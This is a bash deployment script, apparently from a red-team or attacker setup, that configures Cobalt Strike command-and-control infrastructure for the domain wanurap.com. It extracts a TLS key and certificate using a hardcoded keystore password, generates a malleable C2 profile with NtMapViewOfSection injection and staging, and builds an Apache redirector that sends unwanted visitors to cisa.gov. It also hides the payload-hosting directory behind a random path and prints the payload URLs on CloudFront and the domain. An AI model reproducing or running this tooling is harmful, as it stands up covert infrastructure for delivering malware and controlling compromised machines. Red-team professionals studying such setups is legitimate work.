#!/bin/bash

keystore=wanurap.com.store
keystore_path=/opt/cobaltstrike/wanurap.com.store
cloudfront_domain=d3815g0hmfkigc.cloudfront.net
domain=wanurap.com
c2_profile="${domain}-$(date '+%Y-%m-%d').profile"
password=7WTF6WxTG8nPKzB5cXXV4t35CPPsUiXmZBSeXDndhjU=
redirect_location=cisa.gov

# COLORS
RED_FG="\033[1;31m"
GREEN_FG="\033[1;32m"
RESET="\033[0m"

echo -e "[*] Extracting ssl certificate"
ret_status=$(keytool -export -alias $domain -keystore $keystore_path \
    -storepass $password -rfc \
    -file "megazord-composition/src/secrets/cobalt.cert" 2>&1)
if [ $? -gt 0 ]; then
    echo -e "${RED_FG} [\U2757] Error extracting certificate from keystore"
    echo -e "$ret_status${RESET}"
    exit 1
fi
echo -e "${GREEN_FG}[\U2714] ${ret_status}${RESET}\n" 

echo "[*] Extracting key"
openssl pkcs12 -in $keystore_path -passin pass:$password \
    -nodes -nocerts \
    -out "megazord-composition/src/secrets/cobalt.key"
echo -e "${GREEN_FG}[\U2714] Key extracted to ./megazord-composition/src/secrets/cobalt.key${RESET}\n"

echo "[*] Extracting certificate bundle"
keytool -list -rfc -keystore $keystore_path \
    -storepass $password \
    > megazord-composition/src/secrets/ca-bundle.crt
echo -e "${GREEN_FG}[\U2714] Bundle extracted to ./megazord-composition/src/secrets/ca-bundle.crt${RESET}\n"

echo "[*] Generating new c2 profile with SourcePoint"
ret_status=$(./SourcePoint/SourcePoint -Host "$cloudfront_domain" \
    -Outfile "/opt/cobaltstrike/$c2_profile" \
    -Injector NtMapViewOfSection -Stage True \
    -Password $password -Keystore $keystore > /dev/null)
if [ $? -gt 0 ]; then
    echo -e "${RED_FG} [\U2757] Error generating c2 profile"
    echo -e "$ret_status${RESET}"
    exit 1
fi 
echo -e "${GREEN_FG}[\U2714] C2 Profile generated at /opt/cobaltstrike/${c2_profile}${RESET}\n"

echo "[*] Adding c2 profile name to .env"

original_profile=$(grep 'C2_PROFILE' \
    < megazord-composition/.env | cut -d '=' -f 2)
# replace original profile name in .env with new profile name
ret_status=$(sed -i "s|${original_profile}|${c2_profile}|" megazord-composition/.env)
if [ $? -gt 0 ]; then
    echo -e "${RED_FG} [\U2757] Error adding new c2 profile name to .env"
    echo -e "$ret_status${RESET}"
    exit 1
fi
echo -e "${GREEN_FG}[\U2714] C2 Profile generated at /opt/cobaltstrike/${c2_profile}${RESET}\n"

echo "[*] Generating .htaccess based on c2_profile"
ret_status=$(python3 cs2modrewrite/cs2modrewrite.py \
    -i "/opt/cobaltstrike/$c2_profile" -c "https://172.19.0.5" \
    -r "https://$redirect_location" \
    -o megazord-composition/src/apache2/.htaccess)
if [ $? -gt 0 ]; then
    echo -e "${RED_FG} [\U2757] Error generating .htaccess"
    echo -e "$ret_status${RESET}"
    exit 1
fi
echo -e "${GREEN_FG}[\U2714] .htaccess generated at ./megazord-composition/src/apache2/.htaccess${RESET}\n"

echo "[*] Renaming uploads directory with pseudo-random string"
endpoint="$(openssl rand -hex 6)/panda"
new_line="Alias /${endpoint} \"/var/www/uploads\""

uploads=$(grep 'Alias' \
    < megazord-composition/src/apache2/apache2.conf)

sed -i "s|${uploads}|${new_line}|" \
    megazord-composition/src/apache2/apache2.conf
echo -e "${GREEN_FG}[\U2714] Payload endpoint updated to: ${RED_FG}${endpoint}${RESET}\n"

echo -e "Payloads hosted at:"
echo -e "${RED_FG}https://${cloudfront_domain}/${endpoint}/NAME_OF_PAYLOAD${RESET}"
echo -e "\nPayload also accessible at https://${domain}/${endpoint}/NAME_OF_PAYLOAD"
